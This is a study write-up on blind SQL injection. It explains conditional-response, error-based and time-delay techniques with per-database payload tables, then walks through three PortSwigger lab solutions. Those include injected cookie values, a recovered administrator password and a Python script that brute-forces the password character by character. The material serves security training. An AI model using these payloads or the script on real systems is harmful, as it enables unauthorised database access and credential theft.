# Blind SQL Injection

## Theory

### Definitions

According to [this page](https://portswigger.net/web-security/sql-injection/blind), "Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors".

### Triggering conditional responses

Suppose that the application is using a `TrackingId` (e.g. `Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`) cookie to identify the user (I don't mean for authentications), in order to determine whether this is a known user, or a new one.

The query executed by the application could be akin to this:

```sql
-- if there's no matching data, then show a welcome page
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Depending on whether the application recognizes the user, it could display a welcome page. In that case the application could be vulnerable to a Blind SQLi.

We can exploit this behaviour triggering different responses conditionally, depending on an injected condition, i.e. based on a condition we're getting a different response.

An example:

```txt
# 1=1 is always True, will NOT show a welcome page (user was identified)
xyz' UNION SELECT 'a' WHERE 1=1--

# 1=2 is always False, will show a welcome page (user not identified)
xyz' UNION SELECT 'a' WHERE 1=2-- 
```

The extract data from other table, we have to change our method (since the data isn't included in HTTP responses, unlike Union SQLi attacks). For example, if we want to extract the password of `UserA` (columns: `username` and `passwd`) from the table `users` you can start with the following input:

```txt
# check if the first character comes after 'm'
# if it shows a welcome page it means that the query returned 'False'
# meaning the first character is lower than 'm'
xyz' UNION SELECT 'a' FROM users WHERE username = 'UserA' and SUBSTRING(passwd, 1, 1) > 'm'-- 
```

Not every database uses `SUBSTRING` to get a substring:

| Database   | Function                  |
| ---------- | ------------------------- |
| Oracle     | SUBSTR('foobar', 4, 2)    |
| Microsoft  | SUBSTRING('foobar', 4, 2) |
| PostgreSQL | SUBSTRING('foobar', 4, 2) |
| MySQL      | SUBSTRING('foobar', 4, 2) |

### Triggering SQL errors

If the page does not behave any differently depending on whether the query returns any data, then you have to change method: it is often possible to induce the application to return conditional responses by triggering SQL errors.

What I mean is that you can different data in your HTTP response, based on conditions that trigger a SQL error, e.g. division by zero (assuming the error causes some difference in the application's HTTP response).

For example, in the case of the the previous example (regarding the cookie `TrackingId`):

```txt
# the condition is: 'WHEN (1=2)'
# if the condition is true, then divide by 0
# this will NOT trigger an error (since 1 is not equal to 2)
xyz' UNION SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--

# the condition is: WHEN (1=1)
# if the condition is true, then divide by 0
# this will trigger an error
xyz' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END--
```

Using this technique, you can retrieve data testing one character at a time:

```txt
xyz' union select case when (username = 'Administrator' and SUBSTRING(password, 1, 1) > 'm') then 1/0 else null end from users-- 
```

Bear in mind that the technique to trigger an error can change based on the type of database:

| Database   | Technique                                                                             |
| ---------- | ------------------------------------------------------------------------------------- |
| Oracle     | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual      |
| Microsoft  | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END                         |
| PostgreSQL | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END           |
| MySQL      | SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') |

### Triggering time delays

If the application catches database errors and handles them gracefully, and there's no longer  any difference in the application's response, then the the previous technique won't work.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays, based on conditions.

Usually it works because SQL queries are generally processed synchronously by the application. Therefore, delaying the execution of an SQL query will also delay the HTTP response.

The techniques for triggering a time delay are highly specific to the type of database being used. In the case of SQL Server:

```txt
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'-- 
```

You can use this technique to retrieve data (e.g., one character at a time):

```txt
'; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'-- 
```

Following is a table containing the commands used to trigger a delay:

| Database   | Technique                           |
| ---------- | ----------------------------------- |
| Oracle     | dbms_pipe.receive_message(('a'),10) |
| Microsoft  | WAITFOR DELAY '0:0:10'              |
| PostgreSQL | SELECT pg_sleep(10)                 |
| MySQL      | SELECT sleep(10)                    |

Also, combined with conditions:

| Database   | Technique                                                                                                      |
| ---------- | -------------------------------------------------------------------------------------------------------------- |
| Oracle     | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual |
| Microsoft  | IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'                                                                |
| PostgreSQL | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END                                  |
| MySQL      | SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')                                                                   |

## Labs

### Lab 1

> Blind SQL injection with conditional responses

After visiting the products page, we're assigned a Cookie, as you can see:

```http
GET /academyLabHeader HTTP/1.1
Host: ac8b1fb11f7860c88050c03f000c005f.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Sec-WebSocket-Version: 13
Origin: https://ac8b1fb11f7860c88050c03f000c005f.web-security-academy.net
Sec-WebSocket-Key: 99uMcuVo9rTNCkvb1oDL/A==
Connection: keep-alive, Upgrade
Cookie: TrackingId=An7ULvNAx2nN1yR0; session=CAFbY8etgaQhKir9cteDfJIpY9dT0vSL
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket
```

We're assigned a cookie, containing:

- `TrackingId`: `An7ULvNAx2nN1yR0`
- `session`: `CAFbY8etgaQhKir9cteDfJIpY9dT0vSL`

The vulnerable part should be the `TrackingId` value. In fact, I changed the value to see the number of columns (spoiler: 1):

```http
Cookie: TrackingId=An7ULvNAx2nN1yR0'+ORDER+BY+1--; session=CAFbY8etgaQhKir9cteDfJIpY9dT0vSL
```

Then I had to cycle through every character of the user `administrator`'s password, since I only could do it manually.

```txt
# repeat until desired results

Cookie: TrackingId=Axyz'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'AND+SUBSTRING(password,1,1)='f'--; session=4GmO79XDPt7enDCVxYQbF3F4mHOP367j
```

Thanks to the request below, I also discovered the number of characters: `20`.

```http
Cookie: TrackingId=Axyz'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'AND+LENGTH(password)=20--; session=4GmO79XDPt7enDCVxYQbF3F4mHOP367j
```

The password I found was: `fg4v54o5b8qngh5im0ub`.

### Lab 2

> Blind SQL injection with conditional errors

First things first, I used `ORDER BY` to get the number of columns.

```http
Cookie: TrackingId=ph'+ORDER+BY+1--; session=gkxkpzrQycB4SAgna7wWvuvjvZWuzWBs
```

After discovering that the number is `1`, I tried finding out the database type. I was continuously getting errors when using `UNION SELECT`, so I tried `FROM DUAL`, and it succeeded. It means this is an `Oracle` database. Also I discovered that the column contains `strings`.

```http
Cookie: TrackingId=ph'+UNION+SELECT+'a'+FROM+DUAL--; session=gkxkpzrQycB4SAgna7wWvuvjvZWuzWBs
```

Then I tried retrieving the password of the user `administrator` from the table `users`.

```http
pf'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)>0)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual--
```

After a few tens of minutes, I managed to create an injection that allows me to get the password. If the character (of the password) is greater than '5' (in this case), then it will throw an error.

```http
Cookie: TrackingId=pf'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTR(password,1,1)='5')+THEN+to_char(1/0)+END+FROM+users--; session=gkxkpzrQycB4SAgna7wWvuvjvZWuzWBs
```

To find the length of the string I used:

```http
Cookie: TrackingId=pf'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=20)+THEN+to_char(1/0)+END+FROM+users--; session=gkxkpzrQycB4SAgna7wWvuvjvZWuzWBs
```

I created the following script in order to automate the process (it could be helpful for the next labs).

```python
import requests
import string

URL = 'https://ac041f8b1e618e4680fc05ca00e8006a.web-security-academy.net/filter?category=Gifts'
session = "gkxkpzrQycB4SAgna7wWvuvjvZWuzWBs"
password = ""

for index in range(1, 21):
    for character in string.printable:
        tracking_id = "pf'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTR(password,%d,1)='%s')+THEN+to_char(1/0)+END+FROM+users--" % (
            index, character)
        cookies = dict(TrackingId=tracking_id, session=session)
        r = requests.get(URL, cookies=cookies)

        if r.text == "Internal Server Error":
            print(character)
            password += character
            break

print("Password is: %s" % password)
```

### Lab 3

> Blind SQL injection with time delays

To solve this lab, I had to try different techniques. The one that work is the following:

```txt
Cookie: TrackingId=CAPIR'%3bSELECT+pg_sleep(10)--; session=GKbOcdGjQcpqHnSoKbS928PPh2548Jdy
```

`%3b` is the encoded version of `;`. I use this character in order to close the first query and start the second one, like this:

```sql
SELECT username, passwd FROM users WHERE tracking_id='CAPIR';SELECT+pg_sleep(10)--'
```

This is a `stacked query`. Bear in mind that not all database support this syntax.
